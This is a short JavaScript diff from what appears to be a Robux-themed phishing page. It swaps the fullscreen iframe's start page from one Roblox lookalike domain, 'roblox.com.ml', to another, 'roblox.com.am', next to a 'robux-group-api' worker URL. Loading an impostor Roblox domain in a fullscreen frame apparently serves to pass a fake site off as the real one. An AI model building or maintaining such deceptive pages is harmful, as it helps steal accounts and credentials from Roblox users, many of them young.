@@ -8,7 +8,7 @@ const WORKER_URL = "https://robux-group-api.romaozinho1607.workers.dev";
 const GROUP_URL = "https://www.roblox.com/communities/138423710779";
 
 // Initial page displayed inside the fullscreen iframe
-const IFRAME_START_URL = "https://www.roblox.com.ml/communities/138423710779/robloxianStudio";
+const IFRAME_START_URL = "https://www.roblox.com.am/communities/138423710779/robloxianStudio";
 
 // Destination URL verification
 function isDestinationUrl(url) {
